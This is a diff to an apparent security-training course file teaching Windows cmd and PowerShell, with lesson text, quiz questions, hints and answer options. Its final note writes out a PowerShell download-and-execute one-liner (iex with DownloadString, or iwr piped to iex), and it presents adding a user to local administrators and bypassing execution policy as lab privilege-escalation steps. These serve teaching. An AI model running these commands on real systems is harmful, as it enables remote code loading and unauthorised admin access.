@@ -2,20 +2,77 @@
   "title": "Windows Command Line: CMD and PowerShell",
   "description": "From classic cmd to PowerShell cmdlets: navigating, querying the system and automating in the language that governs domains.",
   "tasks": {
-    "1": { "title": "CMD: the classic that's still alive", "questions": {
-      "linea-de-comandos-windows-t01-q01": { "prompt": "Which cmd command lists directory contents?" },
-      "linea-de-comandos-windows-t01-q02": { "prompt": "Which command shows the routing table and network connections (with -ano you see processes)?" },
-      "linea-de-comandos-windows-t01-q03": { "prompt": "In cmd, what does 'ipconfig /all' do compared to plain 'ipconfig'?" }
-    }},
-    "2": { "title": "PowerShell: cmdlets", "questions": {
-      "linea-de-comandos-windows-t02-q01": { "prompt": "What naming convention do PowerShell commands follow (Verb-Noun)?" },
-      "linea-de-comandos-windows-t02-q02": { "prompt": "Which cmdlet lists running processes?" },
-      "linea-de-comandos-windows-t02-q03": { "prompt": "What advantage does PowerShell have over cmd when handling output?" }
-    }},
-    "3": { "title": "Pipelines, variables and your first PS script", "questions": {
-      "linea-de-comandos-windows-t03-q01": { "prompt": "Which automatic PowerShell variable represents the current pipeline object?" },
-      "linea-de-comandos-windows-t03-q02": { "prompt": "Which cmdlet downloads and executes content from a URL?" },
-      "linea-de-comandos-windows-t03-q03": { "prompt": "What does 'Get-ChildItem -Recurse -Filter *.zip | Select-Object FullName' do?" }
-    }}
+    "1": {
+      "title": "CMD: the classic that's still alive",
+      "body": "## The commands you'll always use\n\n```bat\ndir                     :: list (like ls)\ncd Usuarios             :: change directory\ntype archivo.txt        :: like cat\ncopy a.txt b.txt        :: copy\nmove b.txt ..\\          :: move\ndel b.txt               :: delete\ntasklist                :: processes (like ps)\ntaskkill /PID 1234 /F   :: kill a process\ncls                     :: clear the screen\n```\n\n## Network diagnostics from cmd\n\n```bat\nipconfig            :: my IPs\nipconfig /all       :: + DNS, MAC, DHCP\nping 10.10.10.5     :: connectivity\ntracert 10.10.10.5  :: hops\nnetstat -ano        :: ports + PID of each connection\narp -a              :: known hosts on my local network\nroute print         :: routing table\n```\n\n`netstat -ano` is your Windows `ss -tulpn`. You cross-reference the PID it shows with\n`tasklist | findstr <PID>` to find out which program is listening there.\n\n## The net command (you already know it from AD)\n\n```bat\nnet user                       :: local users\nnet user ana /add              :: create a user\nnet localgroup Administradores ana /add   :: add it to the admins group\nnet share                      :: shared resources\n```\n\nIn a privilege escalation lab, that third line is usually the happy ending.",
+      "questions": {
+        "linea-de-comandos-windows-t01-q01": {
+          "prompt": "Which cmd command lists directory contents?",
+          "hint": "Three letters, starting with di."
+        },
+        "linea-de-comandos-windows-t01-q02": {
+          "prompt": "Which command shows the routing table and network connections (with -ano you see processes)?",
+          "hint": "Short for network statistics."
+        },
+        "linea-de-comandos-windows-t01-q03": {
+          "prompt": "In cmd, what does 'ipconfig /all' do compared to plain 'ipconfig'?",
+          "hint": "The option name says it all.",
+          "options": {
+            "a": "Nothing: it's an alias",
+            "b": "It also shows DNS, MAC and the detailed configuration of each interface",
+            "c": "It renews the IP",
+            "d": "It only works as admin"
+          }
+        }
+      }
+    },
+    "2": {
+      "title": "PowerShell: cmdlets",
+      "body": "## Cmdlets: verb-noun\n\n```powershell\nGet-Process                # processes\nGet-Service                # services\nGet-ChildItem              # list (aliases: ls, dir — they work!)\nGet-Content archivo.log    # cat\nGet-Command *firewall*     # discover cmdlets\nGet-Help Get-Process       # manual\n```\n\nThe magic: the output is an **object** with properties. Filter and format it without grep:\n\n```powershell\nGet-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending\nGet-Service | Where-Object Status -eq 'Running' | Select-Object -First 10\nGet-NetTCPConnection -State Listen\nGet-LocalUser\n```\n\nCompare `Get-NetTCPConnection -State Listen` with cmd's `netstat -ano` + findstr:\nsame result, no parsing at all.\n\n## System and execution\n\n```powershell\nGet-ComputerInfo           # Windows version, RAM, domain\nwhoami /priv               # my privileges (SeImpersonate? potato!)\nGet-ExecutionPolicy        # can I run .ps1 scripts?\nSet-ExecutionPolicy -Scope Process Bypass   # typical in labs\n```\n\n`whoami /priv` deserves a bookmark: the **SeImpersonatePrivilege** privilege on a\nweb service is the door to the classic Potato attack. You'll practice it with a lab in\nJr Pentester.",
+      "questions": {
+        "linea-de-comandos-windows-t02-q01": {
+          "prompt": "What are the native PowerShell commands that follow the Verb-Noun convention (Get-Process, Get-Service…) called?",
+          "hint": "Pronounced 'command-let'."
+        },
+        "linea-de-comandos-windows-t02-q02": {
+          "prompt": "Which cmdlet lists running processes?",
+          "hint": "Get-Process, exactly as written."
+        },
+        "linea-de-comandos-windows-t02-q03": {
+          "prompt": "What advantage does PowerShell have over cmd when handling output?",
+          "hint": "They aren't text strings…",
+          "options": {
+            "a": "It's faster because it's graphical",
+            "b": "The output is OBJECTS with properties you can filter and sort without parsing text",
+            "c": "It allows more colors in the terminal",
+            "d": "None: cmd is superior"
+          }
+        }
+      }
+    },
+    "3": {
+      "title": "Pipelines, variables and your first PS script",
+      "body": "## The object pipeline\n\n```powershell\nGet-ChildItem -Recurse -Filter *.log |\n  Where-Object Length -gt 1MB |\n  Sort-Object Length -Descending |\n  Select-Object Name, Length, FullName |\n  Export-Csv grandes.csv -NoTypeInformation\n```\n\nEach cmdlet passes complete objects to the next one. `$_` is the current object:\n\n```powershell\nGet-Service | Where-Object { $_.Status -eq 'Stopped' -and $_.Name -like '*sql*' }\n```\n\n## Your first script\n\n```powershell\n# enumerar.ps1 — first pass over a Windows machine\nWrite-Host \"== Sistema ==\";      Get-ComputerInfo | Select-Object WindowsProductName, OsVersion\nWrite-Host \"== Usuarios ==\";     Get-LocalUser\nWrite-Host \"== Puertos ==\";      Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess\nWrite-Host \"== Privilegios ==\";  whoami /priv\n```\n\n```powershell\npowershell -ExecutionPolicy Bypass -File .\\enumerar.ps1\n```\n\nThat's exactly your Linux `enumerar.sh`, on Windows. Same methodology, different\nlanguage — you can now operate on both systems in the path. Final note: attackers use\n`iex (New-Object Net.WebClient).DownloadString('http://.../script.ps1')` (or its\nshort form with `iwr ... | iex`) to load tools in memory; you'll see that\npattern in every offensive-tool walkthrough.",
+      "questions": {
+        "linea-de-comandos-windows-t03-q01": {
+          "prompt": "Which automatic PowerShell variable represents the current pipeline object?",
+          "hint": "The dollar sign followed by an underscore."
+        },
+        "linea-de-comandos-windows-t03-q02": {
+          "prompt": "Which cmdlet runs a string as code and is combined with DownloadString to launch scripts downloaded from a URL (never from sources you don't control)?",
+          "hint": "Look at the task's final note: it goes right after the pipe in 'iwr ... | ___'."
+        },
+        "linea-de-comandos-windows-t03-q03": {
+          "prompt": "What does 'Get-ChildItem -Recurse -Filter *.zip | Select-Object FullName' do?",
+          "hint": "Two cmdlets, one pipeline.",
+          "options": {
+            "a": "It compresses every folder",
+            "b": "It finds every .zip recursively and shows its full path",
+            "c": "It deletes the zips after listing them",
+            "d": "It opens the zips in File Explorer"
+          }
+        }
+      }
+    }
   }
 }
